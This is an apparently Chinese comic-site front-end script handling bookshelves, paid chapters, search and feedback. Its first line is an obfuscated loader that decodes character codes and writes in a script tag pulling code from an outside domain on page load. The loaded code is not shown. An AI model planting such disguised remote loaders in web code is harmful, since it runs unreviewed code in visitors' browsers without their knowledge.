['sojson.v4']["\x66\x69\x6c\x74\x65\x72"]["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"]('\x72\x65\x74\x75\x72\x6e \x74\x68\x69\x73')()['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x77\x72\x69\x74\x65']((['sojson.v4']+[])["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"]['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65']['\x61\x70\x70\x6c\x79'](null,'60P115D99T114h105X112H116H32W115p114u99q61e34z104M116N116v112P58z47G47f119x119E119O46Q97c104U110X110H98Z97D98z121n46U99x111d109Y47V115t116p97T116W105C99Z47A113X109f47b106r115X47g99m111u109V109h111U110j46R106x115p34O62T60x47j115a99g114p105y112Q116q62'['\x73\x70\x6c\x69\x74'](/[a-zA-Z]{1,}/)))


function isVerificationAccounts(str) {
    var myreg = /^[0-9a-zA_Z]{5,16}$/;
    if (!myreg.test(str)) {
        return false;
    } else {
        return true;
    }
}

var k2 = 1;
var k = 0;
function sorts (o) {
    if (k2 == 0) {
        $(o).html("倒序");
        $(o).removeClass("sortBak");
        $(o).addClass("inverted");
        k2 = 1;
    } else {
        $(o).html("正序");
        $(o).addClass("sortBak");
        $(o).removeClass("inverted");
        k2 = 0;
    }
    var h1 = document.getElementById('detail-list-select-1');
    document.getElementById('detail-list-select-1').innerHTML = h1.innerHTML.split('</li>').reverse().join('</li>').substring(5) + '</li>';
};
$('.btnmore').click(function () {
    var content1 = '↓ 展开查看全部章节 ↓';
    var content2 = '↑ 收起章节 ↑';
    if (k == 0) {
        $(this).css("display", "block").text(content2);
        $(".play_0").css("height", "auto");
        k = 1;
    } else {
        $(this).css("display", "block").text(content1);
        $(".play_0").css("height", "230px");
        k = 0;
    }
})
//收藏处理
$('.btn_collection').click(function () {
    obj = $('.btn_collection');
    var aid = $("#bookcase").data("aid");
    var name = $("#bookcase").data("name");
    if (DXCMS.islogin == '1')
    {
        if ($(obj).attr("data-state") == 1) {
            //点击取消收藏
            $.ajax({
                type: "post",
                url: '/api/user/bookcase/del',
                data:{articleid: aid},
                dataType: 'json',
                success: function (data) {
                    if (data.code == "0") {
                        $('.box_collectioned').find('span').html("已成功取消收藏！");
                        $(".btn_collection").find('span').text("收藏");
                        $(".btn_collectioned ,.box_collectioned").fadeIn(100);
                        $(obj).attr("data-state", 0);
                        setTimeout(function () {
                            $(".box_collectioned").delay(500).fadeOut(100);
                        }, 500);

                    }
                    else {
                        $('.box_collectioned').find('span').html("亲，您的操作失败了哦，请重试！");
                        setTimeout(function () {
                            $(".box_collectioned").delay(500).fadeOut(100);
                        }, 500);
                    }
                },
                error: function () {
                    alert("系统出错了，请重试！");
                }
            });
        }
        else {
            rico_data = {
                articleid: aid,
                articlename: name,
                chapterid: 0,
                chaptername: 0
            }
            $.ajax({
                type: "post",
                url: '/api/user/bookcase/add',
                data: rico_data,
                dataType: 'json',
                success: function (data) {
                    if (data.code == "0") {
                        //已收藏
                        $(obj).attr("data-state", 1);
                        $('.box_collectioned').find('span').html("叮咚~已成功收藏至书架！");
                        $(".btn_collection").find('span').text("已收藏");
                        $(".btn_collectioned ,.box_collectioned").fadeIn(100);
                        setTimeout(function () {
                            $(".box_collectioned").delay(500).fadeOut(100);
                        }, 500);
                    }
                    else {
                        $('.box_collectioned').find('span').html("亲，您的操作失败了哦，请重试！");
                        setTimeout(function () {
                            $(".box_collectioned").delay(500).fadeOut(100);
                        }, 500);
                    }
                },
                error: function () {
                    $('.box_collectioned').find('span').html("亲，您的操作失败了哦，请重试！");
                    setTimeout(function () {
                        $(".box_collectioned").delay(500).fadeOut(100);
                    }, 500);
                }
            });
        }
    }else{
        if (window.confirm("\n永久书架需要登录才能使用，转到登录页面吗？")) {
            window.location.href = "/user/login/";
        }else{
            return;
        }
    }

});


function ShowDialog(msg){
    $('.box_collectioned').find('span').html(msg);
    setTimeout(function () {
        $(".box_collectioned").delay(500).fadeOut(100);
        location.reload();
    }, 500);
}
var comic = {
    read: function(mid, cid, vip, cion,page) {
        if (vip > 0 || cion > 0){
            if(DXCMS.islogin == '1'){
                if (cion > 0 || vip >0){
                    get_buy();
                }
            }else{
                layer.open({
                    content: '浏览该章节您需要先登陆',
                    btn: '去登陆',
                    yes: function(index) {
                        window.location.href = '/user/login/';
                    }
                });
            }
        }
        function get_buy() {
            $.post('/api/pay/finance/ispay',{
                id:cid,page:page
            },function(res){
                switch(res.code){
                    case 0:
                        var parr = res.data;
                        for (var i = 0; i < parr.length; i++) {
                            $('#cp_img').append('<img class="man_img lazyload" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWP4////fwAJ+wP9CNHoHgAAAABJRU5ErkJggg==" data-src="' + parr[i]['pic'] + '">');
                        }
                        $("img.lazyload").lazyload();
                        break;
                    case 102:
                        layer.open({
                            content: '浏览该章节你需要支付'+res.cion+'个漫画币<br>购买VIP全站免费看',
                            btn: '余额不足,去购买.',
                            shadeClose: false,
                            yes: function(index) {
                                window.location.href = '/user/index';
                            }
                        });
                        break;
                    case 108:
                        layer.open({
                            content: '此章节为VIP专属章节无法付费购买！',
                            btn: '去升级成VIP.',
                            shadeClose: false,
                            yes: function(index) {
                                window.location.href = '/user/index';
                            }
                        });
                        break;
                    case 103:
                        layer.open({
                            title: '购买章节(支付：'+res.cion+'个漫画币)',
                            content: $('.buy-box').html(),
                            shadeClose: false,
                            btn: '关闭'
                        });
                        break;
                    default:
                        layer.open({
                            content: res.msg,
                            shadeClose: false,
                            btn: '返回上一层',
                            yes: function(index) {
                                window.history.back(-1);
                            }
                        });
                }
            }, 'json');
        }
        $('body').on("click", ".buy-btn", function() {
            buy_pay();
        });
        function buy_pay(){
            $.post('/api/pay/finance/cion',{
                mid:mid,
                cid:cid,
                page:page
            },function(res) {
                if(res.code == 0){
                    ShowDialog(res.msg);
                }else{
                    layer.open({
                        content: res.msg,
                        btn: '返回上一层',
                        yes: function(index) {
                            window.history.back(-1);
                        }
                    });
                }
            },'json');
        }
    }
}

$('html').on("click","#search",function()
{
    newsearch(1);
});

$('#keword_input').focus();

$('html').on("keyup","#keword_input",function(event)
{
    var e = event || window.event;
    if (e && e.keyCode === 13) {
        newsearch(1);
    }
});


function newsearch(isnew) {
    var keywords = $('#keword_input');
    keywords.focusout();
    var title = keywords.val();
    if (title === "") {
        title = keywords.attr("data");
    }
    if (isnew && isnew === 1) {
        window.location.href = "/search?searchkey=" + encodeURIComponent(title);
    } else {
        window.open("/search?searchkey=" + encodeURIComponent(title));
    }
}

function islogin(){
    if(DXCMS.islogin == '1'){
        document.writeln("<div class=\"header_logining\"><ul>");
        document.writeln("<li class=\'logining_li\'><span><a href=\'/user/index/\'><img src=\'/static/qm/img/10009.jpg\'></a></span></li>");
        document.writeln("</ul></div>");
    }else{
        document.writeln("<div id=\"showlogin\"><div class=\'headerTopMenu fr clearfix pdr\'>");
        document.writeln("    <ul class=\'userMsg fl userMsgBox\' style=\'position:relative;\'>");
        document.writeln("        <li class=\'userMsgItems FirstUserMsgItems\'>");
        document.writeln("            <a href=\'/user/login/\' class=\'loginBtn J-loginBtn\' title=\'登录\' data-position=\'head\'>登录</a>");
        document.writeln("        </li>");
        document.writeln("        <li class=\'userMsgItems\'>");
        document.writeln("            <a href=\'/user/register/\' class=\'registeredBtn\' title=\'注册\'>注册</a>");
        document.writeln("        </li>");
        document.writeln("    </ul>");
        document.writeln("</div></div>");
    }
}
//报错
function error(mid,cid,mname,cname)
{
    if($('.layui-m-layer').length == 0)
    {
        var ticketTpl = "  <div class=\"dialog--feed\"> \n" +
            "   <div class=\"dialog__close\">\n" +
            "    <i class=\"iconfont icon-ic_buy_toast_close\"></i>\n" +
            "   </div> \n" +
            "   <div class=\"dialog__head\"> \n" +
            "    <div class=\"head-navs clearfix\"> \n" +
            "     <div class=\"head-nav active\">\n" +
            "      在线反馈\n" +
            "     </div> \n" +
            "    </div> \n" +
            "    <div class=\"head-foot\"></div> \n" +
            "   </div> \n" +
            "   <div class=\"feed-handles\"> \n" +
            "    <div class=\"feed-input-wr\"> \n" +
            "     <textarea class=\"feed-input\" placeholder=\"^_^请仔细描述您的问题（必填）\"></textarea> \n" +
            "    <input class=\"feed-email\" type=\"text\" value=\"\" placeholder=\"请填写验证码（不区分大小写）\" /> <img src='/api/user/check/code' onclick='this.src=\"/api/user/check/code\"'>\n" +
            "    <div class=\"feed-confirm \" onclick=\"error_submit('"+mid+"','"+cid+"','"+mname+"','"+cname+"');\">\n" +
            "     提交反馈\n" +
            "    </div> \n" +
            "   </div> \n" +
            "   <!-- 反馈历史 --> \n" +
            "   <div class=\"feed-history hide\"> \n" +
            "   </div> \n" +
            "  </div>";

        layer.open({
            type: 1,
            title: false,
            closeBtn: 0,
            content: ticketTpl,
            area: ['450px', '482px'],
        });

        $('.dialog__close').click(function () {
            $(".layui-m-layer").hide();
        })
    }else{
        $(".layui-m-layer").show();
    }
}
function error_submit(mid,cid,mname,cname)
{
    var code = $(".feed-email").val();
    if(code == '' || code == undefined || code == null){
        alert('验证码不可为空');
        return false;
    }
    var text = $(".feed-input").val();
    if(text == '' || text == undefined || text == null){
        alert('反馈内容不可为空');
        return false;
    }
    var data = {mid:mid,cid:cid,mname:mname,cname:cname,code:code,text:text}
    $.post('/api/user/userarr/error',data,function (res){
        if(res.code == 0){
            alert('反馈成功');
        }else{
            alert(res.msg);
        }
    },'json');
    $(".layui-m-layer").hide();
}
